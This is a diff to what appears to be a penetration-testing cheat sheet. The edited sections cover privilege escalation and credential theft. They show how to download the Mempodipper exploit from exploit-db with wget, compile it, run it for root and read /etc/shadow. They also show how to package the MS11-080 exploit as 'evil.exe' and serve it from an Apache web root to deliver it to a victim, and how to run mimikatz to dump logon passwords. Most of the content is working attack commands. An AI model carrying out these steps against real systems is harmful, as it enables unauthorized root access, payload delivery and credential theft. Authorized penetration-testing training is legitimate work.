@@ -68,22 +68,37 @@ wine exe2bat.exe nc.exe nc.txt
 # Local Privilege Escalation - Linux
 
 ssh user@<target IP>
-id                                              # verify user permissions
-cat /etc/shadow                                 # access denied
+id                                              # Show user/group permissions
+cat /etc/shadow                                 # Access denied
+/etc/issue                                      # OS info
+uname -a                                        # Kernel info
+
 wget -O exploit.c http://www.exploit-db.com/download/18411
-gcc -o mempodipper exploit.c                    # compile exploit
-./mempodipper                                   # run exploit
-id                                              # verify root permissions
+gcc -o exploit exploit.c                        # Compile exploit
+./exploit                                       # Run exploit
+id                                              # Show user/group permissions
 cat /etc/shadow
+
+Option 2 - using Kali
+searchsploit linux local root
+Mempodipper - Linux Local Root => 2.6.39 (32-bit & 64-bit)                /linux/local/18411.c
+cp /usr/share/exploitdb/platforms/linux/local/18411.c /tmp/
+cd /tmp/
+gcc -o exploit 18411.c                          # Compile exploit
+Transfer exploit to victim.
 ------------------------------------------------------------------------------------------------------
 
 # Local Privilege Escaltion - Windows XP, 2003
 
 searchsploit ms11-080
-cp /usr/share/exploitdb/platforms/windows/local/18176.py /root/
+cp /usr/share/exploitdb/platforms/windows/local/18176.py /tmp/
 cd /usr/share/pyinstaller/ 
-pyinstaller -F -n evil.exe /root/18176.py
-cp evil.exe/dist/evil.exe /root/
+pyinstaller -F -n evil.exe /tmp/18176.py
+cp evil.exe/dist/evil.exe /tmp/
+
+service apache2 start                           # Start apache.
+netstat -antp | grep apache                     # Verify the service is running.
+cp /tmp/evil.exe /var/www/                      # Copy the exploit to the web root.
 ------------------------------------------------------------------------------------------------------
 
 # Password Cracking
@@ -125,4 +140,3 @@ query DELETE FROM hosts WHERE ip_address='192.168.2.12'
 mimikatz
 priviledge::debug
 sekurlsa::logonpasswords
-
